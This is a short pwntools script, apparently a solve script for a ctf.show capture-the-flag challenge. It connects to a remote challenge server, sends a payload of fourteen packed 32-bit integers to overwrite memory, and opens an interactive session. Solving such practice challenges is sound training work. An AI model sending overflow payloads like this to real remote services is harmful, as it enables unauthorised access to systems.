from pwn import *
context.log_level='debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28232)
payload = p32(17) * 0xE
io.recv()
io.sendline(payload)
io.interactive()
